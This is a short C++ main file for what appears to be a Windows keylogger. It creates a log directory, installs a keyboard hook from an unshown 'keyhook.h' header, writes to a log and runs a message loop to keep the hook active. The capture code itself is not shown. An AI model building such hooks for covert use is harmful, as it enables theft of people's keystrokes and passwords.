#include "stream.h"
#include "keyhook.h"

int main() {
  stream::MakeDir(stream::GetPath());
  key_hook::InstallHook();

  stream::WriteLog("hi");

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

  return 0;
}
